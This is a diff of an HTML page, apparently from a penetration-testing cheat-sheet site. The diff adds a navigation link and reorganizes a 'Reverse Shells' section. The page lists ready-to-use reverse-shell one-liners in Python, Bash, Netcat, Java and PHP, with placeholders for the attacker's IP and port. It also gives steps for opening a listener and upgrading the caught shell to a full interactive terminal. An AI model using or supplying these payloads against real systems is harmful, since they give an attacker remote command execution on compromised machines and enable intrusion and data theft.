@@ -113,6 +113,11 @@
           
           <li class="bold">
 		        
+    <a class="section-link" href="../kafka/">Kafka</a>
+          </li>
+          
+          <li class="bold">
+		        
     <span class="section-link ">Web</span>
     <ul>
                 <li class="">
@@ -209,15 +214,9 @@
     
     <ul>
     
-        <li><a class="" href="#python">Python</a></li>
+        <li><a class="" href="#on-local-machine">On local machine</a></li>
     
-        <li><a class="" href="#bash">Bash</a></li>
-    
-        <li><a class="" href="#netcat">Netcat</a></li>
-    
-        <li><a class="" href="#java">Java</a></li>
-    
-        <li><a class="" href="#php">PHP</a></li>
+        <li><a class="" href="#on-the-remote-server">On the remote server</a></li>
     
     </ul>
     
@@ -245,26 +244,38 @@
 <p>A list of Reverse Shells on multiple languages. Replace <code>{IP}</code> and <code>{PORT}</code> values
 with a couple <code>IP:port</code> the server can access. Then, on your local machine you open
 a listener with <code>netcat</code>:</p>
+<h2 id="on-local-machine">On local machine</h2>
+<p>To listen for an incoming connection and upgrade to a pty shell:</p>
 <pre><code class="bash">nc -lvnp {PORT}
+
+# after the connection is established
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 </code></pre>
 
-<h2 id="python">Python</h2>
+<p>Then, <code>Ctrl-Z</code> and type:</p>
+<pre><code class="bash">stty raw -echo
+</code></pre>
+
+<p>The console should be black, next foreground the shell with <code>fg</code> then
+reinitialize the terminal with <code>reset</code>.</p>
+<h2 id="on-the-remote-server">On the remote server</h2>
+<h3 id="python">Python</h3>
 <pre><code class="bash">python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;{IP}\\&quot;,{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);\'
 </code></pre>
 
-<h2 id="bash">Bash</h2>
+<h3 id="bash">Bash</h3>
 <pre><code class="bash">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
 </code></pre>
 
-<h2 id="netcat">Netcat</h2>
+<h3 id="netcat">Netcat</h3>
 <pre><code class="bash">nc -e /bin/sh {IP} {PORT}
 </code></pre>
 
-<h2 id="java">Java</h2>
+<h3 id="java">Java</h3>
 <pre><code class="java">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
 </code></pre>
 
-<h2 id="php">PHP</h2>
+<h3 id="php">PHP</h3>
 <pre><code class="bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
             
